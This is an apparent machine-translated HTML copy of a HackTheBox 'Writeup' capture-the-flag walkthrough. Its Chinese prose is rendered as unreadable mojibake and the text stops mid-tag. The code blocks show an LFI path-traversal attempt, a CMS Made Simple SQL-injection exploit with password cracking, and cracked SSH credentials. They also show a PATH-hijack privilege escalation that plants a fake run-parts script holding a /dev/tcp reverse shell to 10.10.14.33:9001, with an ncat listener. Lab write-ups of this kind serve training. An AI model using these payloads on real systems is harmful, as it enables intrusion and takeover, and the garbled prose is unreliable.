<html>
<head>
<title>HacktheBox â€” Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HacktheBox â€”è®°å½•</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/hackthebox-writeup-2978c1639fb4?source=collection_archive---------0-----------------------#2019-10-12">https://infosecwriteups.com/hackthebox-writeup-2978c1639fb4?source=collection_archive---------0-----------------------#2019-10-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b661" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯ä¸€ç¯‡å…³äºæˆ‘å¦‚ä½•ä»HacktheBoxè§£å†³Writeupçš„æ–‡ç« ã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/bcc4e493db3eaf6d0c4877cc4c99fc80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/format:webp/1*wc1eU9Aerqx6TdyeMSmfbA.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated"><a class="ae kx" href="https://www.hackthebox.eu/home/machines/profile/192" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.eu/home/machines/profile/192</a></figcaption></figure><p id="1d2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>æ˜¯ä¸€ä¸ªåœ¨çº¿å¹³å°ï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œç»ƒä¹ æ¸—é€æµ‹è¯•æŠ€èƒ½ã€‚</p><p id="e893" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œæˆ‘è¯•å›¾è§£é‡Šæˆ‘æ˜¯å¦‚ä½•ä»æœºå™¨ä¸Šç†è§£è¿™äº›æ¦‚å¿µçš„ï¼Œå› ä¸ºæˆ‘æƒ³çœŸæ­£ç†è§£äº‹ç‰©æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚æ‰€ä»¥è¯·ï¼Œå¦‚æœæˆ‘è¯¯è§£äº†ä¸€ä¸ªæ¦‚å¿µï¼Œè¯·è®©æˆ‘çŸ¥é“ã€‚</p><h1 id="b508" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">å…³äºç›’å­:</h1><p id="4555" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">Writeupæ˜¯HacktheBoxä¸Šçš„ç®€æ˜“è¯„çº§æœºã€‚è¿™æ˜¯ä¸€ä¸ªç›¸å¯¹ç®€å•çš„ç›’å­ï¼Œå‘æ‚¨ä»‹ç»$PATHåŠ«æŒçš„æ¦‚å¿µã€‚ä¸ºäº†è·å–ç”¨æˆ·ï¼Œæˆ‘åˆ©ç”¨CMSåˆ¶é€ ç®€å•æ¼æ´æ¥è·å–SSHçš„å‡­è¯ã€‚ç„¶åï¼Œæˆ‘åˆ›å»ºäº†ä¸€ä¸ªè„šæœ¬ï¼Œå…¶ä¸­run-partsè¢«è®¾ç½®ä¸ºrunï¼Œå½“æœ‰äººSSHè¿›å…¥è¯¥æ¡†æ—¶å°±ä¼šæ‰§è¡Œè¯¥è„šæœ¬ã€‚</p><h1 id="715e" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">ä¾¦å¯Ÿ:</h1><p id="da34" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æˆ‘é¦–å…ˆé€šè¿‡è°ƒç”¨å‘½ä»¤è¿è¡Œåˆå§‹nmapæ‰«æï¼Œå°†å…¶ä¿å­˜åˆ°æˆ‘çš„nmapç›®å½•:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="f89c" class="mg kz iq mc b gy mh mi l mj mk">nmap -sV -sC -oA nmap/initial 10.10.10.138</span></pre><p id="8173" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¾“å‡ºæ˜¯:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ml"><img src="../Images/129ca13bd855fe61d1667ec005a0d110.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6f0ffr--8jOUUHAaPxdj9g.png"/></div></div></figure><p id="18b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç„¶åæˆ‘æ£€æŸ¥httpå’Œrobots.txt:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/172f9608d827a48bc6437e6eccfc913a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1140/format:webp/1*1iFpMwmK5-z5aoyjOvBDdg.png"/></div></figure><p id="9970" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨ç½‘é¡µä¸­ï¼Œä¸€ä¸ªæ¨ªå¹…æš—ç¤ºæœ‰æŸç§ç±»å‹çš„DoSä¿æŠ¤ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½åœ¨æ²¡æœ‰é¢„é˜²æªæ–½çš„æƒ…å†µä¸‹å¯¹ç›®å½•è¿›è¡Œå¼ºåˆ¶æˆ–æ¨¡ç³Šå¤„ç†ã€‚å¦å¤–ï¼Œè¯·æ³¨æ„writeup.htbåŸŸã€‚æˆ‘å¯ä»¥å°†å®ƒæ·»åŠ åˆ°æˆ‘çš„/etc/hostsä¸­ï¼Œæ£€æŸ¥æœºå™¨ä¸Šæ˜¯å¦å®ç°äº†æŸç§ç±»å‹çš„<a class="ae kx" href="https://httpd.apache.org/docs/2.4/vhosts/examples.html" rel="noopener ugc nofollow" target="_blank">è™šæ‹Ÿä¸»æœº</a>ã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/476e91d85a9fb3423dda8b23b4317a6f.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/format:webp/1*OOwvXE9YWsQpWZOvf-lR_g.png"/></div></figure><p id="3832" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å‘ä¸‹æ»šåŠ¨é¡µé¢ï¼Œæˆ‘å¯ä»¥æ³¨æ„åˆ°å¯èƒ½æœ‰ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬ä»¥åå¯ä»¥ä½¿ç”¨ã€‚</p><h2 id="b74b" class="mg kz iq bd la ms mt dn le mu mv dp li jy mw mx lm kc my mz lq kg na nb lu nc bi translated">æ£€æŸ¥æœºå™¨äºº. txt</h2><p id="8d28" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æŸ¥<a class="ae kx" href="https://en.wikipedia.org/wiki/Robots_exclusion_standard" rel="noopener ugc nofollow" target="_blank"> robots.txt </a>ï¼Œæœ‰ä¸€ä¸ªç›®å½•å«â€œwriteupâ€ã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nd"><img src="../Images/557fc12454ce134b88408ec00c64960f.png" data-original-src="https://miro.medium.com/v2/resize:fit:850/format:webp/1*LXjob2z-Nl-9TAt00suhrg.png"/></div></div></figure><p id="ef39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åŸºæœ¬ä¸Šï¼Œæ ‡è®°ä¸ºä¸å…è®¸çš„å†…å®¹å¯ä»¥é˜²æ­¢æœç´¢å¼•æ“ç­‰ç½‘ç»œçˆ¬è™«åœ¨è¿™äº›ç›®å½•/æ–‡ä»¶ä¸Šâ€œçˆ¬è¡Œâ€ã€‚è®¿é—®/writeupå¹¶æ£€æŸ¥å…¶æ¥æºï¼Œå®ƒä½¿ç”¨äº†ä¸€ä¸ªåä¸ºCMS Made Simpleçš„å†…å®¹ç®¡ç†ç³»ç»Ÿã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ne"><img src="../Images/52c7727cbc56b4c6328c8e5221041e31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fIjy7VyUq5E1BM9llNr6Iw.png"/></div></div></figure><h2 id="2e5c" class="mg kz iq bd la ms mt dn le mu mv dp li jy mw mx lm kc my mz lq kg na nb lu nc bi translated"><strong class="ak"> CMSåˆ¶ä½œç®€å•</strong></h2><p id="34e7" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æ£€æŸ¥URLï¼Œé¡µé¢å‚æ•°ç­‰äºå–å†³äºä½ è®¿é—®çš„æ–‡ç« çš„åç§°</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nf"><img src="../Images/648f9f28b3f38d4dbd64aff2a0bcbb7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zxR-TW4UjczsKTnpOe96WA.png"/></div></div></figure><p id="69d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç„¶åï¼Œæˆ‘å°è¯•åœ¨é¡µé¢å‚æ•°ä¸Šè®¾ç½®ä¸€ä¸ªå…¬å…±LFI</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="4183" class="mg kz iq mc b gy mh mi l mj mk">view-source:<a class="ae kx" href="http://10.10.10.138/writeup/index.php?page=../../../../../../../../etc/passwd" rel="noopener ugc nofollow" target="_blank">http://10.10.10.138/writeup/index.php?page=../../../../../../../../etc/passwd</a></span></pre><p id="bb31" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¾“å‡ºæ˜¯:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/ab925eccb7828cd66e2f37afb6422e31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1074/format:webp/1*0UAoDPkvIY3MPCloxGXjEw.png"/></div></figure><h1 id="2e59" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated"><strong class="ak">è·å–ç”¨æˆ·</strong></h1><p id="8670" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">çœ‹åˆ°å®ƒä¸èµ·ä½œç”¨ï¼Œæˆ‘å†³å®šç»§ç»­å‰è¿›ã€‚ç”±äºæˆ‘çœ‹åˆ°äº†CMSçš„ä½¿ç”¨ï¼Œæˆ‘æ£€æŸ¥searchsploitæ¥æ£€æŸ¥æ˜¯å¦æœ‰æˆ‘å¯ä»¥åˆ©ç”¨çš„æ¼æ´ã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nh"><img src="../Images/a79f0dc86ea89cd931c3b4859be4c680.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vAX-MJmtrF5CLjGcLCATRA.png"/></div></div></figure><p id="d3f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å› ä¸ºæœ‰å¾ˆå¤šæ¼æ´ï¼Œæ‰€ä»¥æˆ‘å†³å®šåœ¨ç½‘ä¸ŠæŸ¥æ‰¾æœ€è¿‘çš„æ¼æ´ï¼Œç„¶åå‘ç°äº†è¿™ä¸ª:</p><p id="7b80" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kx" href="https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html" rel="noopener ugc nofollow" target="_blank">https://packets storm security . com/files/152356/CMS-Made-Simple-SQL-injection . html</a></p><p id="0abb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">çœ‹åˆ°è¿™ä¸ªæ¼æ´ä¹Ÿåˆ—åœ¨searchsploitç»“æœä¸­ï¼Œæˆ‘å°†å®ƒå¤åˆ¶åˆ°æˆ‘çš„å·¥ä½œç›®å½•ä¸­è¿›è¡Œå°è¯•ã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ni"><img src="../Images/67615974f01f03c8c9f5d99779637ea9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5l2_m-q69XFs9a2uE_SfnQ.png"/></div></div></figure><p id="3f8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ£€æŸ¥å…¶ç”¨æ³•:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="5a5f" class="mg kz iq mc b gy mh mi l mj mk">root@kali:~/Documents/htb/boxes/writeup/new# python exploit.py <br/>[+] Specify an url target<br/>[+] Example usage (no cracking password): exploit.py -u <a class="ae kx" href="http://target-uri" rel="noopener ugc nofollow" target="_blank">http://target-uri</a><br/>[+] Example usage (with cracking password): exploit.py -u <a class="ae kx" href="http://target-uri" rel="noopener ugc nofollow" target="_blank">http://target-uri</a> --crack -w /path-wordlist<br/>[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.</span></pre><p id="fcaf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç”±äºè¯¥æ¼æ´æ˜¯åŸºäºæ—¶é—´çš„ç›²SQLæ³¨å…¥ï¼Œæˆ‘è®°ä¸‹äº†æ—¶é—´ï¼Œä»¥ä¾¿åœ¨éœ€è¦æ—¶è¿›è¡Œè°ƒæ•´:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nj"><img src="../Images/597503767f7018d0f8b9508f66e42043.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DkUjh9Jh7YMRXF02eLWE4g.png"/></div></div></figure><p id="15eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æŒ‰ç…§å®ƒçš„ç”¨æ³•ï¼Œæˆ‘ç„¶åå°è¯•åˆ©ç”¨:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="ff17" class="mg kz iq mc b gy mh mi l mj mk">python exploit.py -u <a class="ae kx" href="http://10.10.10.138/writeup" rel="noopener ugc nofollow" target="_blank">http://10.10.10.138/writeup</a> --crack -w /usr/share/wordlists/rockyou.txt</span></pre><p id="ed3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¾“å‡ºæ˜¯:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/cf087c99f004752a95931d00e15a560a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1062/format:webp/1*8pbZp4XIIzdvwOq0IsX-TQ.png"/></div></figure><p id="4049" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨ç”¨æˆ·å<strong class="jp ir"> jkr </strong>å’Œå¯†ç <strong class="jp ir"> raykayjay9 </strong>ï¼Œæˆ‘è¯•ç€SSHè¿›å…¥è¿™ä¸ªç›’å­ï¼Œå®ƒæˆåŠŸäº†:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nl"><img src="../Images/56520d61158cbfe555567b742990d644.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EEZ5a-Ubj6513LT8ktmWMQ.png"/></div></div></figure><h1 id="5b62" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">è·å–æ ¹</h1><p id="e3e0" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">ç„¶åæˆ‘æ£€æŸ¥SUIDäºŒè¿›åˆ¶æ–‡ä»¶:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="7b8d" class="mg kz iq mc b gy mh mi l mj mk">jkr@writeup:/home$ find / -perm -u=s -type f 2&gt;/dev/null<br/>/bin/su<br/>/bin/mount<br/>/bin/ping<br/>/bin/umount<br/>/usr/bin/gpasswd<br/>/usr/bin/pkexec<br/>/usr/bin/chfn<br/>/usr/bin/passwd<br/>/usr/bin/newgrp<br/>/usr/bin/chsh<br/>/usr/lib/eject/dmcrypt-get-device<br/>/usr/lib/policykit-1/polkit-agent-helper-1<br/>/usr/lib/openssh/ssh-keysign<br/>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br/>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br/>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span></pre><p id="f1c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å› ä¸ºæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œæ‰€ä»¥æˆ‘è¿è¡Œps auxï¼Œçœ‹åˆ°ä¸€ä¸ªcleanup.plæ–‡ä»¶ä»¥UID=0è¿è¡Œï¼Œè¿™æ„å‘³ç€è¯¥è¿›ç¨‹æ˜¯ç”±rootè¿è¡Œçš„ã€‚ç„¶åï¼Œæˆ‘ä½¿ç”¨pspy64ç›‘æ§åå°è¿è¡Œçš„è¿›ç¨‹:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nm"><img src="../Images/789bf30f382d26ad9cde332bee1aa212.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BM_4lEXcayhKPfDSAPIs0A.png"/></div></div></figure><p id="75d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å½“æˆ‘æœ€åˆè§£å†³è¿™å°æœºå™¨æ—¶ï¼Œæˆ‘åœ¨å…è´¹æœåŠ¡å™¨ä¸Šã€‚è¿è¡Œpspy64æ—¶ï¼Œæˆ‘çœ‹åˆ°æœ‰ä¸€ä¸ªrun-partsäºŒè¿›åˆ¶æ–‡ä»¶ç”±rootè¿è¡Œã€‚</p><h2 id="082e" class="mg kz iq bd la ms mt dn le mu mv dp li jy mw mx lm kc my mz lq kg na nb lu nc bi translated">è¿è½¬é›¶ä»¶</h2><p id="0630" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">åŸºæœ¬ä¸Šï¼Œrun-partsåœ¨ä¸€ä¸ªç›®å½•ä¸­è¿è¡Œè„šæœ¬æˆ–ç¨‹åºã€‚å› ä¸ºå®ƒè¿è¡Œ/etc/update-motd.dç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘å°è¯•ç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œå¦‚æœå®ƒè¢«æ‰§è¡Œï¼Œå®ƒå°†pingæˆ‘ã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nn"><img src="../Images/5b96116ce908437e8be57a4ea1e0178f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x86aWT46p8OichgkbUu-XQ.png"/></div></div></figure><p id="279d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å› ä¸ºæˆ‘æ²¡æœ‰å†™æƒé™ï¼Œæ‰€ä»¥æˆ‘è¯•ç€åˆ†è§£å¹¶ç†è§£è¿™ä¸€è¡Œ:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="fef9" class="mg kz iq mc b gy mh mi l mj mk">sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd<br/>.d &gt; /run/motd.dynamic.new</span></pre><blockquote class="no np nq"><p id="8df5" class="jn jo nr jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">sh -c:è¿è¡Œå‘½ä»¤ï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯/usr/bin/env</p><p id="c532" class="jn jo nr jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">env:åœ¨ä¿®æ”¹åçš„ç¯å¢ƒä¸­è¿è¡Œç¨‹åºï¼Œå…¶ä¸­-iè¡¨ç¤ºåœ¨ç©ºç¯å¢ƒä¸­å¯åŠ¨ï¼Œä¸ºPATHçš„è®¾ç½®è®©è·¯</p><p id="c19e" class="jn jo nr jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">PATH=/usr/local/sbinã€‚ã€‚ã€‚:å°†/usr/local/sbinè®¾ç½®ä¸ºè¿è¡Œä¸å¸¦å‰ç¼€çš„å‘½ä»¤æ—¶çš„ä¼˜å…ˆæœç´¢ä½ç½®ã€‚/ï¼Œæœ€åä¸€ä¸ªé€‰é¡¹æ˜¯/bin</p><p id="76c3" class="jn jo nr jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">run-parts:åœ¨å®ƒåé¢çš„ç›®å½•ä¸‹è¿è¡Œè„šæœ¬ï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯/etc/update-motd.dï¼Œå°†å…¶è¾“å‡ºç®¡é“åŒ–åˆ°/run/motd.dynamic.new</p><p id="6aff" class="jn jo nr jp b jq jr js jt ju jv jw jx ns jz ka kb nt kd ke kf nu kh ki kj kk ij bi translated">lsbsysinit:åŸºæœ¬ä¸Šè¡¨ç¤ºè„šæœ¬åç§°ä¸èƒ½ä»¥ç»“å°¾ã€‚dpkg-æ—§çš„æˆ–ã€‚dpkg-dist orã€‚dpkg-æ–°çš„æˆ–ã€‚dpkg-tmp</p></blockquote><p id="d318" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€ä»¥æ¯æ¬¡æˆ‘SSHçš„æ—¶å€™ï¼Œä¸Šé¢çš„è„šæœ¬éƒ½ä¼šè¢«æ‰§è¡Œã€‚å› ä¸º/usr/local/sbinè¢«è®¾ç½®ä¸ºä¼˜å…ˆè·¯å¾„ï¼Œæ‰€ä»¥æˆ‘è¯•ç€å†™ä¸€ä¸ªæ–‡ä»¶/usr/local/sbin/æˆ‘é¦–å…ˆå°è¯•ä½¿ç”¨ä¸€ä¸ªæ‰§è¡Œpingå‘½ä»¤çš„è„šæœ¬:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="fb37" class="mg kz iq mc b gy mh mi l mj mk">#!/bin/bash</span><span id="3082" class="mg kz iq mc b gy nv mi l mj mk">ping -c 2 10.10.14.33</span></pre><p id="3375" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½ å¯ä»¥åœ¨ä¸‹é¢çš„æˆªå›¾ä¸­çœ‹åˆ°ï¼Œæˆ‘èƒ½å¤Ÿä»writeup.htb(10.10.10.138)è·å¾—pingã€‚è¿™è¡¨æ˜æˆ‘æœ‰å‘½ä»¤æ‰§è¡Œã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nw"><img src="../Images/316b1650dff809e382a122cf6657c01c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5n-6oDznLdtT-z1a1C9gMg.png"/></div></div></figure><p id="4d00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç„¶åæˆ‘ç¼–è¾‘è¿è¡Œéƒ¨åˆ†çš„å†…å®¹:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="a35d" class="mg kz iq mc b gy mh mi l mj mk">#!/bin/bash</span><span id="2b5c" class="mg kz iq mc b gy nv mi l mj mk">bash -i &gt;&amp; /dev/tcp/10.10.14.33/9001 0&gt;&amp;1</span></pre><p id="4632" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®¾ç½®æˆ‘çš„ç›‘å¬å™¨:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="c062" class="mg kz iq mc b gy mh mi l mj mk">ncat -nlvp 9001</span></pre><p id="2dcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å°†è¿è¡Œéƒ¨åˆ†è„šæœ¬å¤åˆ¶åˆ°/usr/local/sbin/:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="476b" class="mg kz iq mc b gy mh mi l mj mk">cp run-parts /usr/local/sbin/run-parts</span></pre><p id="b02d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å½“æˆ‘è¿›å…¥ç›’å­åï¼Œæˆ‘å¾—åˆ°äº†ä¸€ä¸ªå¤–å£³:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nx"><img src="../Images/c42086a7eb6f8c9c4c63a6f28f4c7816.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ra6tYCZXBPZjC3zeW4hCrA.png"/></div></div></figure><p id="a307" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ç°åœ¨å¯ä»¥è¯»root.txtäº†..</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="ecbe" class="mg kz iq mc b gy mh mi l mj mk">root@writeup:/root# cat root.txt<br/>cat root.txt<br/><strong class="mc ir">eeba47f60....</strong></span></pre><p id="91c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘è¿˜æ£€æŸ¥äº†/root/binä¸‹çš„cleanup.plè„šæœ¬:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ny"><img src="../Images/62d9b2f25cef1b3e9c63af3d415d61e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e8XJkNAAi0lZr5OOcuxhVg.png"/></div></div></figure><p id="d49a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯ä¸€ä¸ªé¿å…å‰§é€çš„æ¸…ç†è„šæœ¬ã€‚è¯·æ³¨æ„ï¼Œåœ¨é•¿è„šæœ¬ä¹‹åæœ‰ä¸€ä¸ªrun-partsâ€”lsbsysinit/etc/update/motd . dã€‚</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nz"><img src="../Images/abc2eb78d6017d9552a447bda9254795.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WfGjdjmIktaYWAaAwO6w9w.png"/></div></div></figure><p id="767f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åˆ†è§£ä¸€ä¸‹ï¼Œæˆ‘è¿˜æŸ¥äº†ä»€ä¹ˆæ˜¯/etc/update-motd.d:</p><pre class="km kn ko kp gt mb mc md me aw mf bi"><span id="908e" class="mg kz iq mc b gy mh mi l mj mk">Executable scripts in /etc/update-motd.d/* are executed by <a class="ae kx" href="http://manpages.ubuntu.com/manpages/disco/en/man8/pam_motd.8.html" rel="noopener ugc nofollow" target="_blank"><strong class="mc 